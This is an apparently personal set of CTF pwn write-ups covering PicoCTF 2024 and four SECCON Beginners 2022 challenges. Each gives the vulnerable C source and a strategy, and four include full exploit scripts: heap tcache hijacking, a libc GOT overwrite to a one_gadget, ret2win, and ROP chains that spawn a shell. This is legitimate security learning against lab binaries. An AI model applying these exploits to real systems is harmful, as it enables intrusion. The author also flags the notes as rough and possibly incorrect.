because this writeup is for my remind, it is very rough and might be incorrect especially "high frequency troubles".
# 4/27 PicoCTF 2024 High Frequency Troubles
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

enum
{
    PKT_OPT_PING,
    PKT_OPT_ECHO,
    PKT_OPT_TRADE,
} typedef pkt_opt_t;

enum
{
    PKT_MSG_INFO,
    PKT_MSG_DATA,
} typedef pkt_msg_t;

struct
{
    size_t sz;
    uint64_t data[];
} typedef pkt_t;

const struct
{
    char *header;
    char *color;
} type_tbl[] = {
    [PKT_MSG_INFO] = {"PKT_INFO", "\x1b[1;34m"},
    [PKT_MSG_DATA] = {"PKT_DATA", "\x1b[1;33m"},
};

void putl(pkt_msg_t type, char *msg)
{
    printf("%s%s\x1b[m:[%s]\n", type_tbl[type].color, type_tbl[type].header, msg);
}

// gcc main.c -o hft -g
int main()
{
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    putl(PKT_MSG_INFO, "BOOT_SQ");

    for (;;)
    {
        putl(PKT_MSG_INFO, "PKT_RES");

        size_t sz = 0;
        fread(&sz, sizeof(size_t), 1, stdin);

        pkt_t *pkt = malloc(sz);
        pkt->sz = sz;
        gets(&pkt->data);

        switch (pkt->data[0])
        {
        case PKT_OPT_PING:
            putl(PKT_MSG_DATA, "PONG_OK");
            break;
        case PKT_OPT_ECHO:
            putl(PKT_MSG_DATA, (char *)&pkt->data[1]);
            break;
        default:
            putl(PKT_MSG_INFO, "E_INVAL");
            break;
        }
    }

    putl(PKT_MSG_INFO, "BOOT_EQ");
}
```
Sending packet, it was separated to 3 parts, size, type and data.
There was a heap overflow bug in receiving data. And this program didn't have any free call.
## Strategy
- In first, I overwrited size of topchunk to smaller value, and called malloc with a size greater than new size of topchunk to free top chunk. When I called malloc after freeing topchunk, a heap address was left in new malloced chunk so, I leaked heap address from it.
- Next, I called malloc with the size which will cause mmap syscall. The chunk from mmap was near Thread Local Storage. So, I overwrited the address of Tcache Perthread Struct to my fake struct I sent, to manipulate tcache. By manipulating tcache I leaked glibc address, and I did GOT overwrite in libc to one_gadget by same technique of libc leak. 
```python
#!/usr/bin/env python
import ptrlib as ptr


elf = ptr.ELF("./hft_patched")
libc = ptr.ELF("libc.so.6")
io = ptr.Process(elf.filepath)
# io = ptr.Socket("tethys.picoctf.net", 55233)


def send(sz, content, option=1):
    io.recvuntil(b"PKT_RES")
    io.send(p32(sz))
    if len(content) != 0:
        payload = p32(0) + p64(option) + content
    else:
        payload = p32(0) + b"\x01\0\0\0\0\0"
    io.sendline(payload)


p64 = ptr.p64
p32 = ptr.p32
u64 = ptr.u64
info = ptr.logger.info

######################
## LEAK HEAP ADDRESS
######################

send(0x10, b"")
send(0x10, b"A" * 8 + p64(0xD31))
send(0x1000, b"B" * (0x1000 - 16))
send(0x8, b"")

io.recvuntil(b":[")
heap_base = u64(io.recvline().strip(b"]")) - 0x2D0
info("HEAP BASE: " + hex(heap_base))


######################
## LEAK LIBC ADDRESS
######################

payload = b"C" * (8 * 6)
payload += p64(heap_base + 0x380)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
send(0x80, payload)

payload = b"D" * 0x316D8 + p64(heap_base + 0x340 - 0x80)
send(0x30001, payload)

send(0x10, b"")
io.recvuntil(b":[")
libc.base = u64(io.recvline().strip(b"]")) - 0x21A2E0

######################
## OVERWRITE GOT IN LIBC
######################

# 全ては調べてないが、少なくとも以下の２つのGOTは書き換えるとシェルを取れる。
got_addr = libc.base + 0x219098
# got_addr = libc.base + 0x219090
info(f"GOT ADDRESS BEING OVERWRITTEN: {hex(got_addr)}")

payload = b"F" * 0x626D8 + p64(heap_base + 0x350 - 0x80)
send(0x30001, payload, 0)

payload = b"E" * (8 * 6)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
if got_addr % 0x10 == 0:
    payload += p64(got_addr)
else:
    payload += p64(got_addr - 8)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
send(0x10, payload)

one_gadget = 0xEBCF5
io.send(p64(0x10))
io.send(p64(libc.base + one_gadget))

io.recvuntil(b"[PKT_RES]")
io.sendline(p64(0x10))
io.sh()
```
# 5/7 SECCON for Beginners 2022 BeginnersBof
I got a program and its source code. `chall` and `src.c`
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <err.h>

#define BUFSIZE 0x10

void win() {
    char buf[0x100];
    int fd = open("flag.txt", O_RDONLY);
    if (fd == -1)
        err(1, "Flag file not found...\n");
    write(1, buf, read(fd, buf, sizeof(buf)));
    close(fd);
}

int main() {
    int len = 0;
    char buf[BUFSIZE] = {0};
    puts("How long is your name?");
    scanf("%d", &len);
    char c = getc(stdin);
    if (c != '\n')
        ungetc(c, stdin);
    puts("What's your name?");
    fgets(buf, len, stdin);
    printf("Hello %s", buf);
}

__attribute__((constructor))
void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    alarm(60);
}
```
`main` function has buffer overflow vulnerability obviously.
I can set length of the buffer which will save my input. 
Therefore, I just overwrite a return address of the `main` to `win`
```python
#!/usr/bin/env python
import ptrlib as p


def unwrap(x):
    if x is None:
        exit(1)
    else:
        return x


elf = p.ELF("./chall")

offset = 40
payload = b"A" * offset
payload += p.p64(unwrap(elf.symbol("win")))

io = p.Process(elf.filepath)
io.sendline(str(len(payload)))
io.sendline(payload)

flag_content = io.recvregex(b"flag\{(.*?)\}")[0].decode()
flag = "flag{" + flag_content + "}"
p.logger.info(f"flag: {flag}")
```
# 5/8 SECCON for Beginners 2022 Raindrop
Source code was given.
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BUFF_SIZE 0x10

void help() {
    system("cat welcome.txt");
}

void show_stack(void *);
void vuln();

int main() {
    vuln();
}

void vuln() {
    char buf[BUFF_SIZE] = {0};
    show_stack(buf);
    puts("You can earn points by submitting the contents of flag.txt");
    puts("Did you understand?") ;
    read(0, buf, 0x30);
    puts("bye!");
    show_stack(buf);
}

void show_stack(void *ptr) {
    puts("stack dump...");
    printf("\n%-8s|%-20s\n", "[Index]", "[Value]");
    puts("========+===================");
    for (int i = 0; i < 5; i++) {
        unsigned long *p = &((unsigned long*)ptr)[i];
        printf(" %06d | 0x%016lx ", i, *p);
        if (p == ptr)
            printf(" <- buf");
        if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE))
            printf(" <- saved rbp");
        if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE + 0x8))
            printf(" <- saved ret addr");
        puts("");
    }
    puts("finish");
}

__attribute__((constructor))
void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    help();
    alarm(60);
}
```
In `vuln` function, buffer overflow bug was existing in which I can overwrite 24 extra bytes.
Ths string `"finish"` contained `"sh"` and `system` was used in `help`, so I used them to create a rop chain.
```python
#!/usr/bin/env python
import ptrlib as ptr


def unwrap(x):
    if x is None:
        exit(1)
    else:
        return x


elf = ptr.ELF("./chall")
io = ptr.Process(elf.filepath)

payload = b"A" * 24
payload += ptr.p64(next(elf.gadget("pop rdi; ret")))
payload += ptr.p64(next(elf.find(b"sh\x00")))
payload += ptr.p64(0x00000000004011E5)  # help+15 ie. system()

ptr.logger.info(f"payload length: {len(payload)}")
if len(payload) > 48:
    ptr.logger.error("payload length is too long!")
    exit()

io.sendline(payload)
io.recvuntil(b"finish")
io.recvuntil(b"finish")
io.sh()
```
# 5/9 SECCON for Beginners 2022 Snowdrop
It was a typical ROP problem.
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BUFF_SIZE 0x10

void show_stack(void *);

int main() {
    char buf[BUFF_SIZE] = {0};
    show_stack(buf);
    puts("You can earn points by submitting the contents of flag.txt");
    puts("Did you understand?") ;
    gets(buf);
    puts("bye!");
    show_stack(buf);
}

void show_stack(void *ptr) {
    puts("stack dump...");
    printf("\n%-8s|%-20s\n", "[Index]", "[Value]");
    puts("========+===================");
    for (int i = 0; i < 8; i++) {
        unsigned long *p = &((unsigned long*)ptr)[i];
        printf(" %06d | 0x%016lx ", i, *p);
        if (p == ptr)
            printf(" <- buf");
        if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE))
            printf(" <- saved rbp");
        if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE + 0x8))
            printf(" <- saved ret addr");
        puts("");
    }
    puts("finish");
}

__attribute__((constructor))
void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    alarm(60);
}
```
In `main` function, it had a buffer overflow bug that allows an attacker to overwrite the stack without any limit.
According to the `checksec` , the program has stack canary. However, I couldn't find any stuff likes canary, so I did debug and I realized that if saved rbp was not changed, overflow was not detected. Saved rbp can be fetched from output of the program, so I inserted saved rbp in front of ROP chain.
```python
#!/home/ryohz/.pyenv/shims/python

import ptrlib as ptr


def unwrap(x):
    if x is None:
        ptr.logger.error("failed to unwrap")
        exit(1)
    else:
        return x


elf = ptr.ELF("./chall")
io = ptr.Process(elf.filepath)

io.recvuntil(b"========+===================")
io.recvline()
io.recvline()
io.recvline()

rbp = int(io.recvline().split(b" | ")[1].strip(b"  <- saved rbp"), 16)
ptr.logger.info(f"rbp: {hex(rbp)}")

payload = b"A" * 16
payload += ptr.p64(rbp)
payload += ptr.p64(next(elf.gadget("pop rdx; ret;")))
payload += b"/bin/sh\x00"
payload += ptr.p64(next(elf.gadget("pop rax; ret;")))
payload += ptr.p64(0x4BD000)
payload += ptr.p64(next(elf.gadget("mov [rax], rdx; pop rbx; ret;")))
payload += b"AAAAAAAA"
payload += ptr.p64(next(elf.gadget("pop rdi; ret;")))
payload += ptr.p64(0x4BD000)
payload += ptr.p64(next(elf.gadget("pop rsi; ret;")))
payload += ptr.p64(0)
payload += ptr.p64(next(elf.gadget("pop rdx; ret;")))
payload += ptr.p64(0)
payload += ptr.p64(next(elf.gadget("pop rax; ret;")))
payload += ptr.p64(0x3b)
payload += ptr.p64(next(elf.gadget("syscall; ret;")))

io.sendline(payload)
io.recvuntil(b"finish")
io.recvuntil(b"finish")

io.sh()
```
# 5/10 SECCON for Beginners 2022 simplelist
Following source code was given. According to my search, problem must has contained`glibc-2.33`in competition however, its github archive doesn't contain libc.
```c
#define DEBUG 1

#include "list.h"

int read_int() {
  char buf[0x10];
  buf[read(0, buf, 0xf)] = 0;

  return atoi(buf);
}

void create() {
  Memo *e = malloc(sizeof(Memo));
#if DEBUG
  printf("[debug] new memo allocated at %p\n", e);
#endif
  if (e == NULL)
    err(1, "%s\n", strerror(errno));

  printf("Content: ");
  gets(e->content);
  e->next = NULL;
  list_add(e);
}

void edit() {
  printf("index: ");
  int index = read_int();

  Memo *e = list_nth(index);

  if (e == NULL) {
    puts("Not found...");
    return;
  }

#if DEBUG
  printf("[debug] editing memo at %p\n", e);
#endif
  printf("Old content: ");
  puts(e->content);
  printf("New content: ");
  gets(e->content);
}

void show() {
  Memo *e = memo_list;
  if (e == NULL) {
    puts("List empty");
    return;
  }
  puts("\nList of current memos");
  puts("-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-");
  for (int i = 0; e != NULL; e = e->next) {
#if DEBUG
    printf("[debug] memo_list[%d](%p)->content(%p) %s\n", i, e, e->content,
           e->content);
    printf("[debug] next(%p): %p\n", &e->next, e->next);
#else
    printf("memo_list[%d] %s\n", i, e->content);
#endif
    i++;
  }
  puts("-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-\n");
}

void menu() {
  puts("");
  puts("1. Create new memo");
  puts("2. Edit existing memo");
  puts("3. Show memo");
  puts("4. Exit");
}

int main() {
  puts("Welcome to memo organizer");
  menu();
  printf("> ");
  int cmd = read_int();
  while (1) {
    switch (cmd) {
    case 1:
      create();
      break;
    case 2:
      edit();
      break;
    case 3:
      show();
      break;
    case 4:
      puts("bye!");
      exit(0);
    default:
      puts("Invalid command");
      break;
    }
    menu();
    printf("> ");
    cmd = read_int();
  }
}

__attribute__((constructor)) void init() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(60);
}
```
And header file was given.
```c
#include <err.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define CONTENT_SIZE 0x20

typedef struct memo {
  struct memo *next;
  char content[CONTENT_SIZE];
} Memo;

Memo *memo_list = NULL;

static inline void list_add(Memo *e) {
  if (memo_list == NULL) {
    memo_list = e;
#if DEBUG
    printf("first entry created at %p\n", memo_list);
#endif
  } else {
    Memo *tail = memo_list;
    while (tail->next != NULL)
      tail = tail->next;
#if DEBUG
    printf("adding entry to %p->next\n", tail);
#endif
    tail->next = e;
  }
}

static inline Memo *list_nth(int index) {
  if (memo_list == NULL)
    return NULL;

  Memo *cur = memo_list;
  int i;
  for (i = 0; i != index && cur->next != NULL; ++i, cur = cur->next)
    ;
  if (i != index)
    return NULL;
  else
    return cur;
}
```
This program is application to take notes which were consists of original linked-list structure.
`edit` function had heap overflow bug obviously.
## strategy
- taking 2 notes.
- editing 0 note to overwirte next address of note 1 to GOT(puts).
- leaking libc address from contents of note 2.
- GOT(puts) overwriting to`one gadget`by overwriting contents of note 2.
